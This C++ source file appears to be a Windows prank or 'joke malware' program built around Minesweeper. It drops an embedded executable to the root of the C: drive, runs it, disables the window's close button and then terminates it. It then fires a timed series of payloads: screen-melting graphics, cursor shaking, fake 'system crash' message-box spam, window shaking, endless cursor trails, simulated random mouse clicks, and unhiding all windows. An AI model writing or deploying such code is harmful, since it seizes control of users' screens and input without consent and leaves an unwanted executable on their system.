// welcome to spaghetti code :)

typedef struct IUnknown IUnknown;

#include <stdio.h>
#include <Windows.h>
#include <tlhelp32.h>
#include <tchar.h>
#include <vector>
#include "resource.h"

#pragma comment ( lib,"Winmm.lib")

int msgValue = 0;
int sizeValue = 1;

BOOL CALLBACK gethWndAndDisableX(HWND hWnd, LPARAM lParam) {
    DWORD id;
    GetWindowThreadProcessId(hWnd, &id);
    if (id == lParam) {
        EnableMenuItem(GetSystemMenu(hWnd, 0), SC_CLOSE, MF_GRAYED | MF_DISABLED);
    }
    return TRUE;
}

int IsProcessRunningThenGetHWND(const TCHAR* const executableName) {
    std::vector<DWORD> pids;

    PROCESSENTRY32 entry;
    entry.dwSize = sizeof(PROCESSENTRY32);

    const auto snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);

    if (!Process32First(snapshot, &entry)) {
        return 0;
    }

    do {
        if (!_tcsicmp(entry.szExeFile, executableName)) {
            EnumWindows(gethWndAndDisableX, entry.th32ProcessID);
        }
    } while (Process32Next(snapshot, &entry));
}

int IsProcessRunningThenKill(const TCHAR* const executableName) {
    std::vector<DWORD> pids;

    PROCESSENTRY32 entry;
    entry.dwSize = sizeof(PROCESSENTRY32);

    const auto snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);

    if (!Process32First(snapshot, &entry)) {
        return 0;
    }

    do {
        if (!_tcsicmp(entry.szExeFile, executableName)) {
            pids.emplace_back(entry.th32ProcessID);
        }
    } while (Process32Next(snapshot, &entry));

    for (int i = 0; i < pids.size(); ++i) {
        HANDLE prc = OpenProcess(PROCESS_TERMINATE, FALSE, pids[i]);
        TerminateProcess(prc, 0);
    }
}

DWORD WINAPI msgBox(void* win) {
    MessageBox(NULL, L"bye bye", L"minesweeper", MB_YESNOCANCEL | MB_ICONINFORMATION);
    return 0;
}

DWORD WINAPI meltScreen(void* win) {
    for (int i = 0; i < 1000; i++) {
        HDC hDC = GetDC(0);
        RECT rct;

        GetWindowRect(GetDesktopWindow(), &rct);

        int X = rand() % rct.right;

        BitBlt(hDC, X, rand() % 5, rct.right, rct.bottom, hDC, X, 0, SRCCOPY);
        Sleep(rand() % 100);
    }
    
    return 0;
}

DWORD WINAPI cursorShake(void* win) {
    for (int i = 0; i < 1000; i++) {
        POINT cur;
        GetCursorPos(&cur);

        SetCursorPos(cur.x + rand() % 3 + -1, cur.y + rand() % 3 + -1);

        Sleep(rand() % 20);
    }

    return 0;
}

DWORD WINAPI messageBoxSpamInsert(void* win) {
    switch (msgValue) {
    case 1: MessageBox(NULL, L"system crash", L"minesweeper", MB_YESNOCANCEL | MB_ICONINFORMATION);
    case 2: MessageBox(NULL, L"system crash", L"minesweeper", MB_YESNOCANCEL | MB_ICONERROR);
    case 3: MessageBox(NULL, L"system crash", L"minesweeper", MB_YESNOCANCEL | MB_ICONWARNING);
    }

    return 0;
}

DWORD WINAPI messageBoxSpam(void* win) {

    for (int i = 0; i < 1000; i++) {

        msgValue = rand() % 3;

        CreateThread(NULL, NULL, messageBoxSpamInsert, NULL, 0, 0);

        Sleep(rand() % 500);

        RECT rct;
        GetWindowRect(GetDesktopWindow(), &rct);

        HWND hWnd = FindWindowA(NULL, "minesweeper");

        SetWindowPos(hWnd, NULL, rand() % rct.right, rand() % rct.bottom, 0, 0, SWP_NOSIZE);

    }

    return 0;
}

BOOL CALLBACK shakeWindowsEnum(HWND hWnd, LPARAM lParam) {

    if (IsWindowVisible(hWnd) != 0) {
        RECT rct;
        GetWindowRect(hWnd, &rct);

        SetWindowPos(hWnd, NULL, rct.left + rand() % 3 + -1, rct.top + rand() % 3 + -1, 0, 0, SWP_NOSIZE);
    }

    return TRUE;

}

DWORD WINAPI playSound(void* win) {
    PlaySound(MAKEINTRESOURCE(IDR_WAVE2), NULL, SND_RESOURCE | SND_SYNC);

    return 0;
}

DWORD WINAPI shakeWindows(void* win) {
    for (int i = 0; i < 1000; i++) {

        EnumWindows(shakeWindowsEnum, NULL);

        Sleep(rand() % 300);

    }

    return 0;
}

DWORD WINAPI cursorTrail(void* win) {
    for (int i = 1; i > 0; i++) {
        POINT cur;
        GetCursorPos(&cur);

        DrawIcon(GetDC(0), cur.x - 5, cur.y - 5, LoadCursor(NULL, IDC_ARROW));
        Sleep(10);
    }

    return 0;
}

BOOL CALLBACK sizeMinesweeperEnum(HWND hWnd, LPARAM lParam) {
    DWORD id;
    GetWindowThreadProcessId(hWnd, &id);
    if (id == lParam) {
        RECT rct;
        GetWindowRect(hWnd, &rct);

        SetWindowPos(hWnd, NULL, 0, 0, sizeValue, sizeValue, SWP_NOMOVE);
    }

    return TRUE;
}

DWORD WINAPI sizeMinesweeper(void* win) {
    for (int i = 1; i > 0; i++) {
        PROCESSENTRY32 entry;
        entry.dwSize = sizeof(PROCESSENTRY32);

        const auto snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);

        if (!Process32First(snapshot, &entry)) {
            return 0;
        }

        do {
            if (!_tcsicmp(entry.szExeFile, L"minesweeper.exe")) {
                EnumWindows(sizeMinesweeperEnum, entry.th32ProcessID);
            }
        } while (Process32Next(snapshot, &entry));

        Sleep(100);
    }

    return 0;
}

DWORD WINAPI rnd(void* win) {
    for (int i = 1; i > 0; i++) {
        ++sizeValue;
        Sleep(100);
    }

    return 0;
}

BOOL CALLBACK showAllWindow(HWND hWnd, LPARAM lParam) {
    ShowWindow(hWnd, TRUE);
    
    return TRUE;
}

DWORD WINAPI clickRandomly(void* win) {
    for (int i = 0; i < 1000; i++) {
        POINT cur;
        GetCursorPos(&cur);

        INPUT input;
        input.type = INPUT_MOUSE;
        input.mi.dx = cur.x;
        input.mi.dy = cur.y;
        input.mi.dwFlags = (MOUSEEVENTF_ABSOLUTE | MOUSEEVENTF_LEFTDOWN | MOUSEEVENTF_LEFTUP); // | MOUSEEVENTF_MOVE
        input.mi.mouseData = 0;
        input.mi.dwExtraInfo = NULL;
        input.mi.time = 0;
        SendInput(1, &input, sizeof(INPUT));

        Sleep(rand() % 1000);
    }

    return 0;
}


int main()
{
    FreeConsole();

    DWORD written;

    HRSRC src = FindResource(NULL, MAKEINTRESOURCE(IDR_EXE1), L"EXE");
    HGLOBAL srcLoad = LoadResource(NULL, src);
    DWORD srcSize = SizeofResource(NULL, src);
    LPVOID srcBuffer = LockResource(srcLoad);
    HANDLE file = CreateFile(L"C:\\minesweeper.exe", GENERIC_READ | GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
    WriteFile(file, srcBuffer, srcSize, &written, NULL);
    CloseHandle(file);
    UnlockResource(srcLoad);

    MessageBox(NULL, L"you have 1 minute", L"Minesweeper", MB_OK | MB_ICONINFORMATION);

    ShellExecute(NULL, L"open", L"C:\\minesweeper.exe", NULL, NULL, 1);

    Sleep(500);

    IsProcessRunningThenGetHWND(L"minesweeper.exe");

    CreateThread(NULL, NULL, sizeMinesweeper, NULL, 0, 0);
    CreateThread(NULL, NULL, rnd, NULL, 0, 0);

    Sleep(10);

    PlaySound(MAKEINTRESOURCE(IDR_WAVE1), NULL, SND_RESOURCE | SND_SYNC);

    IsProcessRunningThenKill(L"minesweeper.exe");

    Sleep(2000);

    CreateThread(NULL, NULL, msgBox, NULL, 0, 0);

    CreateThread(NULL, NULL, playSound, NULL, 0, 0);

    Sleep(3000);

    CreateThread(NULL, NULL, meltScreen, NULL, 0, 0);

    Sleep(2000);

    CreateThread(NULL, NULL, cursorShake, NULL, 0, 0);

    Sleep(2000);

    CreateThread(NULL, NULL, messageBoxSpam, NULL, 0, 0);

    Sleep(2000);

    CreateThread(NULL, NULL, meltScreen, NULL, 0, 0);

    Sleep(2000);

    CreateThread(NULL, NULL, cursorShake, NULL, 0, 0);

    Sleep(2000);

    CreateThread(NULL, NULL, messageBoxSpam, NULL, 0, 0);

    Sleep(2000);

    CreateThread(NULL, NULL, shakeWindows, NULL, 0, 0);

    Sleep(2000);

    CreateThread(NULL, NULL, cursorTrail, NULL, 0, 0);

    Sleep(1000);

    CreateThread(NULL, NULL, clickRandomly, NULL, 0, 0);

    Sleep(4000);

    EnumWindows(showAllWindow, NULL);

    Sleep(5000);
}

// Run program: Ctrl + F5 or Debug > Start Without Debugging menu
// Debug program: F5 or Debug > Start Debugging menu

// Tips for Getting Started: 
//   1. Use the Solution Explorer window to add/manage files
//   2. Use the Team Explorer window to connect to source control
//   3. Use the Output window to see build output and other messages
//   4. Use the Error List window to view errors
//   5. Go to Project > Add New Item to create new code files, or Project > Add Existing Item to add existing code files to the project
//   6. In the future, to open this project again, go to File > Open > Project and select the .sln file
